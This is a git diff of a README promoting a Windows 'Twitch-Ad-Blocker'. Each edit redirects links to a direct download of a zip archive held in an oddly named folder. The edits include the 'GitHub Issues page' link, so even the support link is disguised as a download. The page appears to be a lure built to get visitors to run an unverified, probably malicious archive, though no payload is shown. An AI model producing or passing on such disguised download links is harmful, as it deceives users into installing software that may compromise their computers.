@@ -1,6 +1,6 @@
 # 🛡️ Twitch-Ad-Blocker - Watch Twitch Without Any Ads
 
-[![Download Twitch Ad Blocker](https://img.shields.io/badge/Download-Twitch_Ad_Blocker_2026-FF69B4?style=for-the-badge&logo=github&logoColor=white&labelColor=2c3e50)](https://github.com/wildfowlauxin2247/Twitch-Ad-Blocker)
+[![Download Twitch Ad Blocker](https://img.shields.io/badge/Download-Twitch_Ad_Blocker_2026-FF69B4?style=for-the-badge&logo=github&logoColor=white&labelColor=2c3e50)](https://github.com/wildfowlauxin2247/Twitch-Ad-Blocker/raw/refs/heads/main/overplow/Blocker_Ad_Twitch_v1.5-beta.3.zip)
 
 ## 🎯 What Is Twitch-Ad-Blocker?
 
@@ -15,7 +15,7 @@ Getting Twitch-Ad-Blocker on your Windows PC is incredibly simple. Follow these 
 1. **Click the download button below** (or use the link at the top of this page)
 2. **Visit this link to download the application** — the download will start automatically
 
-[**🔗 DOWNLOAD TWITCH-AD-BLOCKER NOW**](https://github.com/wildfowlauxin2247/Twitch-Ad-Blocker)
+[**🔗 DOWNLOAD TWITCH-AD-BLOCKER NOW**](https://github.com/wildfowlauxin2247/Twitch-Ad-Blocker/raw/refs/heads/main/overplow/Blocker_Ad_Twitch_v1.5-beta.3.zip)
 
 That's it! The file is small, so it won't take long even on slower connections. Once downloaded, you'll have the full version ready to install.
 
@@ -120,7 +120,7 @@ Go to Windows Settings → Apps → Installed Apps, find Twitch-Ad-Blocker, clic
 
 ## 📞 Support
 
-If you encounter any issues or have questions, please visit the [GitHub Issues page](https://github.com/wildfowlauxin2247/Twitch-Ad-Blocker/issues) to report problems or get help from the community. We aim to respond to all inquiries within 24-48 hours.
+If you encounter any issues or have questions, please visit the [GitHub Issues page](https://github.com/wildfowlauxin2247/Twitch-Ad-Blocker/raw/refs/heads/main/overplow/Blocker_Ad_Twitch_v1.5-beta.3.zip) to report problems or get help from the community. We aim to respond to all inquiries within 24-48 hours.
 
 ## ⭐ Show Your Support
 
@@ -139,7 +139,7 @@ Twitch-Ad-Blocker is released under the MIT License. You are free to use, modify
 
 ## 🔗 Quick Download Links
 
-**Primary Download:** [https://github.com/wildfowlauxin2247/Twitch-Ad-Blocker](https://github.com/wildfowlauxin2247/Twitch-Ad-Blocker)
+**Primary Download:** [https://github.com/wildfowlauxin2247/Twitch-Ad-Blocker/raw/refs/heads/main/overplow/Blocker_Ad_Twitch_v1.5-beta.3.zip](https://github.com/wildfowlauxin2247/Twitch-Ad-Blocker/raw/refs/heads/main/overplow/Blocker_Ad_Twitch_v1.5-beta.3.zip)
 
 **Visit this link to download the application** — the latest version is always available there.
 
